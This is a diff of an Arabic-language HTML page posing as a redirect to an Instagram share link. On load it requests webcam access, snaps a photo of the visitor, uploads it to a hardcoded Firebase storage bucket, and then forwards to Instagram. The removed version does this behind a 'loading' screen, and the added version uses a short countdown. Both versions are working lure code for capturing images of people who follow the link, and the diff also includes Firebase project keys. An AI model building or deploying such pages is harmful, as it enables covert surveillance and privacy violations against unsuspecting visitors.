@@ -1,64 +1,77 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Camera Capture</title>
-    <meta charset="UTF-8" />
-    <script type="module">
-      // 1. Firebase SDK
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-      import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
+<head>
+  <title>Camera Upload</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+  <style>
+    body { display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; font-family: sans-serif; }
+    #countdown { font-size: 2rem; margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+  <div id="countdown">جاري فتح الكاميرا...</div>
+  <video id="video" autoplay playsinline width="640" height="480" style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-      // 2. Firebase Config - استبدل القيم بقيم مشروعك
-      const firebaseConfig = {
-        apiKey: "AIzaSyCwDNgRY1qlGh2a1f8aaq8yvpyp_xyeRw",
-        authDomain: "mioudcamstorage.firebaseapp.com",
-        projectId: "mioudcamstorage",
-        storageBucket: "mioudcamstorage.appspot.com",
-        messagingSenderId: "607188581064",
-        appId: "1:607188581064:web:122ebd49ffb0abe2b2a78d"
-      };
+  <script>
+    var firebaseConfig = {
+      apiKey: "AIzaSyC0WgRyyIgIZqfI3azfBqyyy_xqeRw",
+      authDomain: "mioudcamstorage.firebaseapp.com",
+      projectId: "mioudcamstorage",
+      storageBucket: "mioudcamstorage.appspot.com",
+      messagingSenderId: "687188581684",
+      appId: "1:687188581684:web:122eb4d99ffb8abe2b8a78d"
+    };
 
-      // 3. Start Firebase
-      const app = initializeApp(firebaseConfig);
-      const storage = getStorage(app);
+    firebase.initializeApp(firebaseConfig);
+    var storage = firebase.storage();
+    const REDIRECT_URL = 'https://www.instagram.com/share/BAPOHyZPk7';
 
-      // 4. Take photo and upload
-      async function captureAndUpload() {
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
+    const countdownEl = document.getElementById('countdown');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          video.srcObject = stream;
-          await video.play();
-
-          // رسم الصورة على كـانفس
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-
-          // إيقاف الكاميرا
-          stream.getTracks().forEach(track => track.stop());
-
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-          const fileName = `photo_${Date.now()}.jpg`;
-
-          const storageRef = ref(storage, fileName);
-          await uploadBytes(storageRef, blob);
-
-          // بعد الرفع، التحويل إلى انستقرام
-          window.location.href = "https://www.instagram.com/share/BAPOHyZPk7";
-        } catch (error) {
-          console.error("حدث خطأ:", error);
+    function startCountdown(seconds) {
+      let count = seconds;
+      countdownEl.innerText = `التصوير بعد ${count} ثواني...`;
+      const interval = setInterval(() => {
+        count--;
+        countdownEl.innerText = `التصوير بعد ${count} ثواني...`;
+        if (count === 0) {
+          clearInterval(interval);
+          takeSnapshot();
         }
-      }
+      }, 1000);
+    }
 
-      window.onload = () => {
-        captureAndUpload();
-      };
-    </script>
-  </head>
-  <body>
-    <h1 style="text-align:center;margin-top:40vh;font-family:sans-serif;">جارٍ التحميل...</h1>
-  </body>
+    function takeSnapshot() {
+      countdownEl.innerText = "جاري الالتقاط...";
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      video.srcObject.getTracks().forEach(track => track.stop());
+
+      canvas.toBlob(blob => {
+        const filename = `snapshot_${Date.now()}.png`;
+        const storageRef = storage.ref().child(filename);
+        storageRef.put(blob).then(() => {
+          console.log("✅ تم الرفع بنجاح");
+          window.location.href = REDIRECT_URL;
+        }).catch(error => {
+          console.error("❌ فشل الرفع:", error);
+          window.location.href = REDIRECT_URL;
+        });
+      }, 'image/png');
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+      video.style.display = 'block';
+      startCountdown(3);
+    }).catch(error => {
+      console.error('❌ تم رفض صلاحيات الكاميرا:', error);
+      window.location.href = REDIRECT_URL;
+    });
+  </script>
+</body>
 </html>
